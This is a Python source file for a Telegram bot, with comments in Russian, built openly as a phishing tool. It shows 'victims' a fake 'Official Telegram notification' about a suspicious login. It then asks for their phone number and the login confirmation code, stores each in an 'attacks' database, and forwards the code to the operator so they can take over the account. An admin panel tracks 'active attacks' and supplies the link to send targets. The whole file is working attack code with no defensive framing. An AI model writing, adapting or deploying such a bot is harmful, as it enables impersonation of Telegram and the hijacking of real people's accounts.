import os
import telebot
import time
import sqlite3
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ========== ПЕРЕМЕННЫЕ ИЗ RAILWAY ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')

if not BOT_TOKEN or not ADMIN_ID:
    print("❌ Ошибка: Добавь BOT_TOKEN и ADMIN_ID в Variables на Railway!")
    exit(1)

try:
    ADMIN_ID = int(ADMIN_ID)
except:
    print("❌ Ошибка: ADMIN_ID должен быть числом")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)
print("✅ Бот запущен")
print(f"👤 Админ ID: {ADMIN_ID}")

# ========== БАЗА ДАННЫХ ==========
conn = sqlite3.connect('attacks.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS attacks
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   phone TEXT,
                   victim_user_id INTEGER,
                   code TEXT,
                   status TEXT,
                   timestamp TEXT)''')
conn.commit()

# ========== ЧТО ВИДИТ ЖЕРТВА ==========
@bot.message_handler(commands=['start'])
def victim_start(message):
    if message.from_user.id == ADMIN_ID:
        # Админ видит панель управления
        show_admin_panel(message)
        return

    # Жертва видит официальное сообщение
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("✅ Подтвердить номер", callback_data="victim_confirm")
    markup.add(btn)

    bot.send_message(
        message.chat.id,
        "🔐 *Официальное уведомление Telegram*\n\n"
        "Зафиксирована попытка входа в ваш аккаунт с нового устройства.\n"
        "Если это были не вы — подтвердите, что номер принадлежит вам.\n\n"
        "📍 *Время:* " + time.ctime() + "\n"
        "📍 *Устройство:* iPhone 13\n"
        "📍 *Местоположение:* Москва, Россия",
        parse_mode="Markdown",
        reply_markup=markup
    )

# ========== ЖЕРТВА НАЖАЛА КНОПКУ ==========
@bot.callback_query_handler(func=lambda call: call.data == "victim_confirm")
def victim_confirm_handler(call):
    victim_id = call.from_user.id

    msg = bot.send_message(
        victim_id,
        "📱 Введите ваш номер телефона в международном формате:\n"
        "`+79161234567`",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, victim_enter_phone)

# ========== ЖЕРТВА ВВЕЛА НОМЕР ==========
def victim_enter_phone(message):
    phone = message.text
    victim_id = message.from_user.id

    # Сохраняем в базу
    cursor.execute(
        "INSERT INTO attacks (phone, victim_user_id, status, timestamp) VALUES (?, ?, ?, ?)",
        (phone, victim_id, 'waiting_code', time.ctime())
    )
    conn.commit()
    attack_id = cursor.lastrowid

    bot.send_message(
        victim_id,
        "📨 Код подтверждения отправлен вам в Telegram.\n"
        "Как только получите — отправьте его сюда."
    )

    # Уведомление админу
    bot.send_message(
        ADMIN_ID,
        f"👤 *Жертва готова!*\n"
        f"ID атаки: {attack_id}\n"
        f"Телефон: {phone}\n\n"
        f"Теперь пытайся войти в аккаунт жертвы!",
        parse_mode="Markdown"
    )

# ========== ЖЕРТВА ОТПРАВЛЯЕТ КОД ==========
@bot.message_handler(func=lambda message: True)
def victim_send_code(message):
    if message.from_user.id == ADMIN_ID:
        return

    cursor.execute(
        "SELECT id FROM attacks WHERE victim_user_id = ? AND status = 'waiting_code'",
        (message.from_user.id,)
    )
    attack = cursor.fetchone()

    if attack and message.text and message.text.isdigit() and len(message.text) <= 6:
        attack_id = attack[0]
        code = message.text

        cursor.execute(
            "UPDATE attacks SET code = ?, status = 'code_received' WHERE id = ?",
            (code, attack_id)
        )
        conn.commit()

        markup = InlineKeyboardMarkup()
        btn = InlineKeyboardButton("✅ Подтвердить код", callback_data=f"approve_{attack_id}")
        markup.add(btn)

        bot.send_message(
            message.chat.id,
            f"🔐 Код: `{code}`\n\n"
            f"Это ваш код? Нажмите подтвердить.",
            parse_mode="Markdown",
            reply_markup=markup
        )

# ========== ЖЕРТВА ПОДТВЕРДИЛА КОД ==========
@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
def victim_approve_code(call):
    attack_id = int(call.data.replace('approve_', ''))

    cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
    row = cursor.fetchone()
    if not row:
        return

    code, phone = row

    bot.send_message(
        ADMIN_ID,
        f"🔥 *КОД ПОЛУЧЕН!*\n\n"
        f"ID атаки: {attack_id}\n"
        f"Телефон: {phone}\n"
        f"Код: `{code}`\n"
        f"Время: {time.ctime()}\n\n"
        f"Введи этот код в Telegram.",
        parse_mode="Markdown"
    )

    bot.send_message(
        call.message.chat.id,
        "✅ Номер подтверждён. Доступ восстановлен."
    )

    cursor.execute("UPDATE attacks SET status = 'completed' WHERE id = ?", (attack_id,))
    conn.commit()

# ========== ПАНЕЛЬ АДМИНА ==========
def show_admin_panel(message):
    markup = InlineKeyboardMarkup()
    btn1 = InlineKeyboardButton("🎯 Новая атака", callback_data="new_attack")
    btn2 = InlineKeyboardButton("📊 Активные атаки", callback_data="list_attacks")
    markup.add(btn1, btn2)

    bot.send_message(
        ADMIN_ID,
        "🔐 *Панель управления*\n\n"
        "Выберите действие:",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.from_user.id == ADMIN_ID)
def admin_callback(call):
    if call.data == "new_attack":
        msg = bot.send_message(
            ADMIN_ID,
            "📱 Введите номер жертвы:\n"
            "Например: +79161234567",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, process_admin_phone)

    elif call.data == "list_attacks":
        show_active_attacks()

def process_admin_phone(message):
    phone = message.text

    bot.send_message(
    ADMIN_ID,
    f"⚠️ Режим ожидания\n"
    f"Номер: {phone}\n\n"
    f"Отправь жертве ссылку:\n"
    f"https://t.me/{bot.get_me().username}\n\n"
    f"Как только жертва напишет — я пришлю уведомление."
)

def show_active_attacks():
    cursor.execute(
        "SELECT id, phone, status, timestamp FROM attacks WHERE status != 'completed' ORDER BY id DESC"
    )
    attacks = cursor.fetchall()

    if not attacks:
        bot.send_message(ADMIN_ID, "Нет активных атак")
        return

    text = "📊 *Активные атаки:*\n\n"
    for a in attacks:
        emoji = {'waiting_code': '⏳', 'code_received': '🔑', 'message_sent': '📨'}.get(a[2], '❓')
        text += f"{emoji} ID: {a[0]} | {a[1]}\n   Статус: {a[2]}\n   {a[3]}\n\n"

    bot.send_message(ADMIN_ID, text, parse_mode="Markdown")

@bot.message_handler(commands=['getcode'])
def getcode(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        attack_id = int(message.text.split()[1])
        cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
        row = cursor.fetchone()
        if row:
            bot.send_message(ADMIN_ID, f"🔑 Код: `{row[0]}`\nТелефон: {row[1]}", parse_mode="Markdown")
        else:
            bot.send_message(ADMIN_ID, "Кода нет")
    except:
        bot.send_message(ADMIN_ID, "Использование: /getcode ID")

if __name__ == "__main__":
    print("🎯 Бот-перехватчик запущен")
    bot.polling()
